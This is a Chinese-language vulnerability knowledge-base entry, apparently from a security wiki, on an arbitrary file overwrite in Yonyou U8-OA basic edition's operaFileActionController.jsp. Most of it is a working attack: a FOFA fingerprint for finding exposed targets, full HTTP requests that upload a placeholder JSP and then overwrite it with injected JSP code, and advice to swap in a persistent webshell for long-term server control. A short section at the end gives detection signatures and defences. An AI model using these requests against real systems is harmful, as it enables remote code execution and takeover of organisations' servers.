---
id: web-java-component-yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite
title: 用友 U8-OA 基础版 operaFileActionController.jsp：path/context 任意文件覆盖写 JSP getshell
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite-jsp
tags:
- java
- yonyou
- u8-oa
- oa
- arbitrary-file-write
- file-overwrite
- jsp
- webshell
- rce
- cnvd
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V335
  verified_at: '2026-11-08T18:58:21+08:00'
  notes: 已对照原文全文与8/8图片核对：operaFileActionController.jsp 的 path/fileop/context→OperaFile.writeFile 覆盖链、doUpload.jsp 占位 JSP、覆盖后 998001 自删除均与原文一致；原文仅展示目标登录页 12.0/12.1 基础版，未声明受影响版本区间，affected_versions 已 --clear；原文未展示登录过程，是否需要认证未验证；PoC 未执行。dedup 仅自匹配，dup-scan 无本卡 pair；无 sources/文章ID/URL/长段摘录；path web/java/component 合法。
url: /docs/web/java/component/web-java-component-yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite/
draft: false
kb_aliases:
- 用友 U8-OA 任意文件覆盖
- operaFileActionController
- fileop=save
- 用友 U8+ OA 文件覆盖 getshell
- Yonyou U8-OA arbitrary file overwrite
---

## 一句话结论

用友 U8-OA 基础版的 `operaFileActionController.jsp` 直接读取 `path`、`fileop`、`context` 参数，在 `fileop=save` 且 `path` 拼接后的文件已存在时调用 `OperaFile.writeFile(file, cont)` 覆盖写入，且不校验文件类型/路径；攻击者先用任意文件上传点放一个 JSP 占位文件，再把其内容覆盖为恶意 JSP，访问即执行 Java 代码并获得服务器权限。

## 原理

- 控制器源码（原文反编译）：
  - `fileName = request.getParameter("path")`、`fileType = request.getParameter("type")`、`fileOp = request.getParameter("fileop")`、`cont = request.getParameter("context")`；
  - `allPath = fileName`；`path = this.getServletContext().getRealPath("/")`；`p = path + allPath`；
  - 当 `fileOp.equals("save")` 且 `op.fileExists(p) == 1` 时，`file = new File(p); op.writeFile(file, cont);`。
- 问题在于：`path` 完全由用户控制并直接拼到 Web 根目录后，没有 canonical/白名单/扩展名校验；存在性检查只要求目标文件“已经存在”，因此任意已存在的文件（尤其是 JSP）都能被覆盖。
- 危害成立的关键是“可解析扩展名 + 可写入内容”：JSP 内容会被 Web 容器编译执行，等价于任意 Java 代码执行；覆盖配置/其他文件则会造成破坏。
- 原文的利用技巧：不直接覆盖系统自带 JSP（有破坏性），而是先利用系统中已有的任意文件上传接口 `doUpload.jsp` 上传一个内容为 `11111` 的 `test.jsp`，从响应拿到服务器生成的随机文件名（如 `1695830703194.jsp`），再用覆盖漏洞把该文件内容改成 `<%out.print(999*999);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>`，访问返回 `998001` 并自删除，证明 JSP 被解析执行。
- 为什么存在性检查挡不住：攻击者可以先用上传点“制造”一个已存在的占位文件，从而满足 `fileExists` 条件；覆盖写接口本身没有再做任何鉴权/路径约束。

## 触发条件

- 目标为用友 U8-OA 基础版（原文 FOFA 指纹：`body="致远" && "/yyoa/" && icon_hash="23842899"`，登录页底部可见“用友 U8+OA 辅助安装程序 12.1 基础版/12.0 基础版”）。
- 可访问 `operaFileActionController.jsp`（原文通用 PoC 路径为 `/yyoa/portal/style/controller/operaFileActionController.jsp`；实际测试中的请求路径为 `/portal/...`，随应用上下文不同而变化）。
- 目标存在可覆盖的 JSP 文件，或存在可上传 JSP 的上传点（原文为 `doUpload.jsp`）以放置占位文件。
- Web 容器会解析被覆盖的扩展名（JSP/JSPX 等）；原文 PoC 仅携带 `JSESSIONID`，未展示登录过程，是否要求认证需按实际目标核实。

## 利用步骤

1. 用 FOFA 指纹定位资产，打开登录页底部确认版本（原文实证 12.0/12.1 基础版）。
2. 上传占位 JSP（若无可上传点，可跳过并选择覆盖系统中已存在的 JSP，但有破坏性）：
   ```http
   POST /xxx/doUpload.jsp HTTP/1.1
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygKGvx2gFuemASlq2

   ------WebKitFormBoundarygKGvx2gFuemASlq2
   Content-Disposition: form-data; name="myfile"; filename="test.jsp"
   Content-Type: application/octet-stream

   11111
   ------WebKitFormBoundarygKGvx2gFuemASlq2--
   ```
   响应中 `window.returnValue = "1695830703194.jsp"`，拼出 `/upload/1695830703194.jsp`。
3. 用覆盖接口写入 JSP 内容（`context` 需 URL 编码）：
   ```http
   GET /xxx/operaFileActionController.jsp?path=/portal/upload/1695830703194.jsp&type=jsp&fileop=save&context=%3C%25out.print%28999%2A999%29%3Bnew+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B%25%3E HTTP/1.1
   Host: xxx:xx81
   Cookie: JSESSIONID=8AF8525D562E345BD18FA00F6E28FFAD
   ```
   响应 `文件保存成功！`。
4. 访问 `/upload/1695830703194.jsp`，页面输出 `998001`（`999*999`）并自删除，证明 JSP 被解析执行。
5. 将 `context` 换成正式 JSP WebShell（冰蝎/哥斯拉等）即可长期控制；避免覆盖系统关键 JSP/配置文件。

## PoC

```http
# 1) 上传占位 JSP，拿到随机文件名
POST /xxx/doUpload.jsp HTTP/1.1
Host: xxx:xx80
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygKGvx2gFuemASlq2

------WebKitFormBoundarygKGvx2gFuemASlq2
Content-Disposition: form-data; name="myfile"; filename="test.jsp"
Content-Type: application/octet-stream

11111
------WebKitFormBoundarygKGvx2gFuemASlq2--

# 2) 覆盖目标 JSP 内容（context 为 URL 编码后的 JSP）
GET /xxx/operaFileActionController.jsp?path=/portal/upload/1695830703194.jsp&type=jsp&fileop=save&context=%3C%25out.print%28999%2A999%29%3Bnew+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B%25%3E HTTP/1.1
Host: xxx:xx81
Cookie: JSESSIONID=8AF8525D562E345BD18FA00F6E28FFAD

# 3) 访问被覆盖的 JSP：输出 998001 并自删除
GET /upload/1695830703194.jsp HTTP/1.1
```

说明：PoC 为原文实测请求的结构化复现，未在本机或任何目标执行；路径前缀（`/yyoa/`、`/portal/`）按实际应用上下文调整。

## 变体与关联

- 变体（无需上传点）：直接覆盖系统中已存在的 JSP（原文明确提示有破坏性，不建议在生产环境使用）。
- 变体（参数）：`type=css` 时 `context` 会经 `URLDecoder.decode(cont,"GBK")`，可影响写入编码；`type=jsp` 不解码。
- 变体（扩展名）：若容器解析其它脚本后缀（jspx/jspf），可尝试覆盖对应文件；覆盖非脚本文件可破坏应用配置。
- 关联：[[web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal]]（致远 OA 任意文件覆盖 JSP，另一产品同一利用模式）；[[web-java-component-yonyou-ksoa-imageupload-arbitrary-file-upload]]（用友 KSOA 上传写 JSP）；[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]（用友 U8 Cloud 任意文件上传）。
- 边界：目标文件不存在时返回“此文件不存在，请先上传文件！”；无上传点且无可覆盖 JSP、文件系统只读、容器不解析 JSP 时利用失败。

## 检测与防御

- 检测特征：对 `operaFileActionController.jsp` 的请求中 `fileop=save` 且 `context` 含 `<%`/JSP 脚本；`path` 指向 `upload`/Web 根下的 JSP；响应出现“文件保存成功！”；上传目录或 Web 根下 JSP 文件被非发布流程修改。
- 防御：删除/下线该 controller 或限制仅管理员访问；`path` 使用白名单并做 `getCanonicalPath()` 校验、拒绝 JSP/脚本扩展名；上传目录与静态目录禁止脚本解析；升级厂商补丁；WAF 拦截 `context`/`path` 中的 JSP 关键字（`<%`、`Runtime`、`ProcessBuilder` 等）。
